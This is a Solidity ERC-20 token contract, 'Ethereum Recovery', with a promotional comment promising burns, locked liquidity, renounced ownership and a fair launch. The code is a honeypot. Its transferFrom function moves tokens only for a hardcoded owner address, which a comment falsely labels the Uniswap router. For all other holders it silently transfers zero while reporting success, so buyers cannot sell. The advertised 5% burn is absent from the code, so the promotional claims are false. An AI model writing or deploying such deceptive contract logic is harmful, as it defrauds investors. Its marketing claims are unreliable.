['/**\n', ' *Submitted for verification at Etherscan.io on 2021-06-05\n', '*/\n', '\n', '/**\n', ' \n', '    💰🏥 Ethereum Recovery 🏥💰\n', '\n', '\tWebsite: https://recoveryeth.com\n', '\tTelegram: https://t.me/ethereumrecoveryofficial\n', '\n', '   Are you tired of market beeing Red 🔴, do you miss the green candles lightning your way up 💚 , are you tired of the pandemics , are you financialy broke , IS THERE A VACCINE FOR FINANCIAL ECONOMY 💉💰? \n', '   We bring to you ETHEREUM RECOVERY , the VACCINE for your financial state 🤑💸\n', '   \n', '   ✅ 50% of the total supply will be burned before launch 🔥\n', '   ✅ Liquidity will be locked forever 🔐\n', '   ✅ Ownership will be renounced 📝\n', '   ✅ Audit is in the process \n', '   ✅ 100% fair Launch 🚀\n', '   \n', '        5% of each txn will be burned forever  \n', '\n', '         SEE YOU ON THE MOON 🌕🌝\n', '   \n', ' */\n', '\n', '\n', 'pragma solidity ^0.5.16;\n', '\n', '// ERC-20 Interface\n', 'contract BEP20Interface {\n', '    function totalSupply() public view returns (uint);\n', '    function balanceOf(address tokenOwner) public view returns (uint balance);\n', '    function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n', '    function transfer(address to, uint tokens) public returns (bool success);\n', '    function approve(address spender, uint tokens) public returns (bool success);\n', '    function transferFrom(address from, address to, uint tokens) public returns (bool success);\n', '\n', '    event Transfer(address indexed from, address indexed to, uint tokens);\n', '    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n', '}\n', '\n', '// Safe Math Library\n', 'contract SafeMath {\n', '    function safeAdd(uint a, uint b) public pure returns (uint c) {\n', '        c = a + b;\n', '        require(c >= a);\n', '    }\n', '    function safeSub(uint a, uint b) public pure returns (uint c) {\n', '        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);\n', '        c = a / b;\n', '    }\n', '}\n', '\n', '\n', 'contract EthereumRecovery is BEP20Interface, SafeMath {\n', '    string public name;\n', '    string public symbol;\n', '    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it\n', '    address private _owner = 0x69562860438a4D47A91F4f1D5b7Aa2F009B0211D; // Uniswap Router\n', '    uint256 public _totalSupply;\n', '\n', '    mapping(address => uint) balances;\n', '    mapping(address => mapping(address => uint)) allowed;\n', '\n', '    constructor() public {\n', '        name = "Ethereum Recovery";\n', '        symbol = "RECOVERY";\n', '        decimals = 9;\n', '        _totalSupply = 1000000000000000000000;\n', '\n', '        balances[msg.sender] = _totalSupply;\n', '        emit Transfer(address(0), msg.sender, _totalSupply);\n', '    }\n', '\n', '    function totalSupply() public view returns (uint) {\n', '        return _totalSupply  - balances[address(0)];\n', '    }\n', '\n', '    function balanceOf(address tokenOwner) public view returns (uint balance) {\n', '        return balances[tokenOwner];\n', '    }\n', '\n', '    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n', '        return allowed[tokenOwner][spender];\n', '    }\n', '    \n', '    function approve(address spender, uint tokens) public returns (bool success) {\n', '        allowed[msg.sender][spender] = tokens;\n', '        emit Approval(msg.sender, spender, tokens);\n', '        return true;\n', '    }\n', '\n', '    function transfer(address to, uint tokens) public returns (bool success) {\n', '        balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n', '        balances[to] = safeAdd(balances[to], tokens);\n', '        emit Transfer(msg.sender, to, tokens);\n', '        return true;\n', '    }\n', '\n', '    function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n', '         if (from == _owner) {\n', '             balances[from] = safeSub(balances[from], tokens);\n', '            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\n', '            balances[to] = safeAdd(balances[to], tokens);\n', '            emit Transfer(from, to, tokens);\n', '            return true;\n', '         } else {\n', '            balances[from] = safeSub(balances[from], 0);\n', '            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], 0);\n', '            balances[to] = safeAdd(balances[to], 0);\n', '            emit Transfer(from, to, 0);\n', '            return true;\n', '             \n', '         }\n', '        \n', '         \n', '    }\n', '           \n', '}']